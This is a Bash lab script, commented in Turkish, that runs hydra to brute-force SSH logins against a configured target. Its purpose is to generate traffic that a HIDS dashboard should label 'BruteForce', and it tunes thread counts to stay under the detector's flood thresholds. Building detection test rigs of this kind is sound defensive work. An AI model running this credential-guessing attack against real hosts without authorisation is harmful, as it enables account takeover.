#!/usr/bin/env bash
# =============================================================================
# 04_brute_ssh.sh — hydra ile SSH (port 22) brute force.
#
# HIDS kuralı:  dst_port==22 && packets_last_sec >= 20  →  BruteForce
#
# KURAL SIRASI TUZAĞI: detector PortScan → SYN_Flood → DoS_Flood → BruteForce
# sırasıyla kontrol eder ve İLK eşleşmede döner. Yani BruteForce etiketini
# alabilmek için paket hızı 20–99/sn arasında ve SYN < 30/sn olmalı.
# Bu yüzden paralelliği DÜŞÜK tutuyoruz (-t 4). Eğer panoda 'DoS_Flood' ya da
# 'SYN_Flood' görürseniz THREADS değerini düşürün (örn. THREADS=2).
#
# Wordlist'ler küçük tutuldu (hızlı demo). Gerçekçi liste için:
#   PASSLIST=/usr/share/wordlists/rockyou.txt ./04_brute_ssh.sh
# Tespit, parola bulunsa da bulunmasa da tetiklenir (önemli olan trafik).
# =============================================================================
set -euo pipefail
source "$(dirname "$0")/config.sh"
require_tool hydra

THREADS="${THREADS:-4}"

banner "SSH Brute Force (hydra → port 22)" "BruteForce"
ping_check
echo "[bilgi] Kullanıcı listesi: $USERLIST   Parola listesi: $PASSLIST   Paralel: $THREADS"
countdown 3

# -L/-P: kullanıcı/parola listeleri.  -t: paralel görev.  -f: ilk bulguda dur.
# -I: önceki oturumu yok say.  -V kaldırıldı (çıktıyı sade tutmak için).
hydra -L "$USERLIST" -P "$PASSLIST" -t "$THREADS" -f -I ssh://"$TARGET" || true

echo
echo "${C_GRN}[bitti]${C_RST} SSH brute force bitti. HIDS panosunda 'BruteForce' görmelisiniz."
echo "         (DoS_Flood/SYN_Flood görürseniz: THREADS=2 ./04_brute_ssh.sh)"
